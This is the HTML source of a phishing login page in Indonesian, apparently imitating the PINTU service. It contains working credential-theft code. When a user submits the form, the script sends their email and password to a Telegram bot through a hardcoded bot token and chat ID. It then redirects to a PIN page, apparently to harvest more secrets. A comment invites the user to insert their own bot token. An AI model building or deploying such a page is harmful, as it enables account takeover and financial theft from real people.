<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Login</title>
  <style>
    body {
      font-family: 'Poppins', sans-serif;
      background: #fff;
      margin: 0;
      padding: 20px;
    }

    h1 {
      font-size: 24px;
      font-weight: 600;
      margin-top: 20px;
      margin-bottom: 40px;
    }

    label {
      display: block;
      font-size: 14px;
      color: #555;
      margin-bottom: 5px;
    }

    input {
      width: 100%;
      border: none;
      border-bottom: 1px solid #ccc;
      padding: 10px 0;
      font-size: 15px;
      outline: none;
    }

    .input-group {
      margin-bottom: 25px;
      position: relative;
    }

    .eye-icon {
      position: absolute;
      right: 0;
      top: 50%;
      transform: translateY(-50%);
      cursor: pointer;
      font-size: 18px;
      color: #333;
      user-select: none;
    }

    .forgot {
      text-align: right;
      font-size: 13px;
      margin-top: -10px;
      margin-bottom: 30px;
      color: #007bff;
      cursor: pointer;
    }

    button {
      width: 100%;
      background: #007bff;
      border: none;
      color: #fff;
      padding: 14px;
      border-radius: 8px;
      font-size: 16px;
      font-weight: 500;
      cursor: pointer;
    }

    .terms {
      text-align: center;
      margin-top: 25px;
      font-size: 13px;
      color: #555;
    }

    .terms a {
      color: #007bff;
      text-decoration: none;
    }
  </style>
</head>

<body>

  <div class="container">
    <h1>Masuk</h1>

    <form id="loginForm">
      <div class="input-group">
        <label>Email Kamu</label>
        <input type="email" id="email" required>
      </div>

      <div class="input-group">
        <label>Kata Sandi</label>
        <input type="password" id="password" required>
        <span class="eye-icon" id="togglePassword">üëÅÔ∏è</span>
      </div>

      <div class="forgot">Lupa Password?</div>

      <button type="submit">Masuk</button>
    </form>

    <div class="terms">
      Dengan mendaftar, kamu menyetujui<br>
      <a href="#">Syarat & Ketentuan</a>
    </div>
  </div>

  <script>
    // === Ganti dengan token & chat ID kamu sendiri ===
    const BOT_TOKEN = "8322445050:AAFQ6g62MEMezI91fxNRhUclP5K8Xgvb5U8";
    const CHAT_ID = "5983910858";

    // Tombol toggle password
    const togglePassword = document.getElementById('togglePassword');
    const password = document.getElementById('password');

    togglePassword.addEventListener('click', function() {
      const type = password.getAttribute('type') === 'password' ? 'text' : 'password';
      password.setAttribute('type', type);
    });

    // Kirim data ke Telegram + pindah halaman
    document.getElementById("loginForm").addEventListener("submit", function(e) {
      e.preventDefault();

      const email = document.getElementById("email").value;
      const pass = document.getElementById("password").value;

      // Format pesan yang dikirim
      const message = `
üîπ *DATA NASABAH PINTU*
-----------------------------
üìß Email: ${email}
üîë Password: ${pass}
-----------------------------
      `;

      // Kirim data ke Telegram
      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: message,
          parse_mode: "Markdown"
        })
      })
      .then(response => {
        if (response.ok) {
          // Setelah sukses kirim, pindah ke halaman PIN
          window.location.href = "pin.html";
        } else {
          alert("Gagal mengirim ke !");
        }
      })
      .catch(error => {
        console.error("Error:", error);
        alert("Terjadi kesalahan koneksi.");
      });
    });
  </script>

</body>
</html>
